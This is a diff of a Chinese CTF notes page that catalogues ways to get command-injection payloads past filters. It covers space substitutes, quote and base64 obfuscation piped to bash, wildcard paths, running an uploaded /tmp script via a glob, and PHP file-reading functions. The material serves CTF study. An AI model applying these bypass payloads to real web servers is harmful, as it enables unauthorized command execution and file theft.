@@ -104,7 +104,7 @@
 <span id="more"></span>
 
 <h1 id="1-过滤空格"><a href="#1-过滤空格" class="headerlink" title="1.过滤空格"></a>1.过滤空格</h1><p>可以用%09、%0a、${IFS}、$IFS$9 、%20、重定向符&lt;&gt;</p>
-<h1 id="2-过滤关键字-cat、flag等"><a href="#2-过滤关键字-cat、flag等" class="headerlink" title="2.过滤关键字(cat、flag等)"></a>2.过滤关键字(cat、flag等)</h1><p>(1)过滤的字符串中加入单引号、双引号或反斜杠（ca’’t、ca””t、ca\t）</p>
+<h1 id="2-过滤关键字-cat、flag等"><a href="#2-过滤关键字-cat、flag等" class="headerlink" title="2.过滤关键字(cat、flag等)"></a>2.过滤关键字(cat、flag等)</h1><p>(1)过滤的字符串中加入单引号、双引号或反斜杠（ca’’t、ca””t、ca\t）&#x2F;nl</p>
 <p>(2)$(print”\x6c\x73”)&#x3D;&#x3D;ls;利用printf+16进制输出ls,用括号外输出ls,等用于反斜杠<code>printf&quot;\x6c\x73&quot;</code>;</p>
 <p>(3)echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash利用base64绕过；</p>
 <p>(4)利用通配符：*&#x2F;?</p>
@@ -115,7 +115,13 @@
 <p>grep命令是文本搜索命令并用show返回</p>
 <p>mv命令的意图是将文件 <code>fl?g.php</code> 重命名为 <code>a.txt</code>。</p>
 <h1 id="4-过滤字母-a-z"><a href="#4-过滤字母-a-z" class="headerlink" title="4.过滤字母[a-z]"></a>4.过滤字母[a-z]</h1><p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???也就是?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p>
-<h1 id="5-过滤字母数字空格"><a href="#5-过滤字母数字空格" class="headerlink" title="5.过滤字母数字空格"></a>5.过滤字母数字空格</h1><p>?c&#x3D;.%20&#x2F;???&#x2F;????????[@-[] 等效 &#x2F;tmp&#x2F;phpxxxxxx</p>
+<h1 id="5-过滤字母数字空格"><a href="#5-过滤字母数字空格" class="headerlink" title="5.过滤字母数字空格"></a>5.过滤字母数字空格</h1><p>写一个上传文件的脚本后抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://xxx.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>传入?c&#x3D;.%20&#x2F;???&#x2F;????????[@-[] 等效 &#x2F;tmp&#x2F;phpxxxxxx</p>
+<p>文件内容为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cat flag.php</span><br><span class="line">或者：cat /var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
 <h1 id="6-过滤system"><a href="#6-过滤system" class="headerlink" title="6.过滤system"></a>6.过滤system</h1><p>show_source(‘’);或者highlight_file(‘flag.php’);或readgzfile(“&#x2F;flag.txt”);或include或require或c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt</p>
 <h1 id="7-查看当前目录"><a href="#7-查看当前目录" class="headerlink" title="7.查看当前目录"></a>7.查看当前目录</h1><p>c&#x3D;print_r(scandir或glob(“&#x2F;“));或var_dump(scandir(“&#x2F;“));或var_export(scandir(“&#x2F;“));或</p>
 <p>$a &#x3D; new DirectoryIterator(“glob:&#x2F;&#x2F;&#x2F;*”); &#x2F;&#x2F; 创建一个DirectoryIterator对象，遍历根目录<br>foreach ($a as $f) { &#x2F;&#x2F; 遍历每个条目;echo($f-&gt;__toString() . ‘ ‘); &#x2F;&#x2F; 输出条目的名称，并添加一个空格};exit(0); &#x2F;&#x2F; 终止脚本执行</p>
